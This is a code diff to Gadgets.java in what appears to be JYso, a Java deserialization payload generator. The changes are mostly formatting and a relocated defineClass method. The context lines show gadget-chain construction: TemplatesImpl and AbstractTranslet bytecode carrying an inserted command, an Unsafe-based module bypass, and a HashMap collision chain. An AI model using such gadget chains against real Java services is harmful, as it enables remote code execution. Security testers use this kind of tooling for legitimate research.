@@ -15,7 +15,7 @@ import java.util.Hashtable;
 import java.util.Map;
 
 import static com.qi4l.JYso.gadgets.Config.Config.*;
-import static com.qi4l.JYso.gadgets.utils.Utils.*;
+import static com.qi4l.JYso.gadgets.utils.Utils.saveCtClassToFile;
 import static com.qi4l.JYso.gadgets.utils.handle.ClassFieldHandler.insertField;
 import static com.qi4l.JYso.gadgets.utils.handle.ClassMethodHandler.insertCMD;
 import static com.qi4l.JYso.gadgets.utils.handle.ClassNameHandler.generateClassName;
@@ -25,9 +25,9 @@ import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIA
 
 public class Gadgets extends ClassLoader {
     public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
-    public static       Class  TPL_CLASS             = TemplatesImpl.class;
-    public static       Class  ABST_TRANSLET         = AbstractTranslet.class;
-    public static       Class  TRANS_FACTORY         = TransformerFactoryImpl.class;
+    public static Class TPL_CLASS = TemplatesImpl.class;
+    public static Class ABST_TRANSLET = AbstractTranslet.class;
+    public static Class TRANS_FACTORY = TransformerFactoryImpl.class;
 
     static {
         // special case for using TemplatesImpl gadgets with a SecurityManager enabled
@@ -78,7 +78,7 @@ public class Gadgets extends ClassLoader {
             Class UnsafeClass = Class.forName("sun.misc.Unsafe");
             Field unsafeField = UnsafeClass.getDeclaredField("theUnsafe");
             unsafeField.setAccessible(true);
-            Unsafe unsafe       = (Unsafe) unsafeField.get(null);
+            Unsafe unsafe = (Unsafe) unsafeField.get(null);
             Object ObjectModule = Class.class.getMethod("getModule").invoke(goalclass);
             unsafe.getAndSetObject(clazz, unsafe.objectFieldOffset(Class.class.getDeclaredField("module")), ObjectModule);
         } catch (Exception e) {
@@ -93,9 +93,9 @@ public class Gadgets extends ClassLoader {
             command = command.substring(1, command.length() - 1);
         }
 
-        CtClass ctClass      = null;
-        byte[]  classBytes   = new byte[0];
-        String  newClassName = generateClassName();
+        CtClass ctClass = null;
+        byte[] classBytes = new byte[0];
+        String newClassName = generateClassName();
 
 
         final Object templates = TPL_CLASS.newInstance();
@@ -172,8 +172,8 @@ public class Gadgets extends ClassLoader {
             command = command.substring(1, command.length() - 1);
         }
 
-        CtClass ctClass      = null;
-        String  newClassName = generateClassName();
+        CtClass ctClass = null;
+        String newClassName = generateClassName();
 
         POOL.insertClassPath(new ClassClassPath(ABST_TRANSLET));
         CtClass superClass = POOL.get(ABST_TRANSLET.getName());
@@ -212,7 +212,7 @@ public class Gadgets extends ClassLoader {
             }
         }
 
-        byte[] bytes     = ctClass.toBytecode();
+        byte[] bytes = ctClass.toBytecode();
         String classCode = Base64.getEncoder().encodeToString(bytes);
         //System.out.println("Base64 Encoded CtClass: " + classCode);
         ctClass.detach();
@@ -238,8 +238,8 @@ public class Gadgets extends ClassLoader {
             command = command.substring(1, command.length() - 1);
         }
 
-        CtClass ctClass      = null;
-        String  newClassName = generateClassName();
+        CtClass ctClass = null;
+        String newClassName = generateClassName();
 
         POOL.insertClassPath(new ClassClassPath(ABST_TRANSLET));
         CtClass superClass = POOL.get(ABST_TRANSLET.getName());
@@ -305,10 +305,6 @@ public class Gadgets extends ClassLoader {
         return s;
     }
 
-    public Class<?> defineClass(String name, byte[] bytecode) {
-        return defineClass(name, bytecode, 0, bytecode.length);
-    }
-
     public static Hashtable makeTableTstring(Object o) throws Exception {
         Map tHashMap1 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
         Map tHashMap2 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
@@ -333,8 +329,8 @@ public class Gadgets extends ClassLoader {
         tHashMap2.put(o2, null);
         Reflections.setFieldValue(tHashMap1, "loadFactor", 1);
         Reflections.setFieldValue(tHashMap2, "loadFactor", 1);
-        HashMap     hashMap     = new HashMap();
-        Class       node        = Class.forName("java.util.HashMap$Node");
+        HashMap hashMap = new HashMap();
+        Class node = Class.forName("java.util.HashMap$Node");
         Constructor constructor = node.getDeclaredConstructor(int.class, Object.class, Object.class, node);
         constructor.setAccessible(true);
         Object node1 = constructor.newInstance(0, tHashMap1, "Unam4", null);
@@ -345,5 +341,9 @@ public class Gadgets extends ClassLoader {
         Array.set(arr, 1, node2);
         Reflections.setFieldValue(hashMap, "table", arr);
         return hashMap;
+    }
+
+    public Class<?> defineClass(String name, byte[] bytecode) {
+        return defineClass(name, bytecode, 0, bytecode.length);
     }
 }
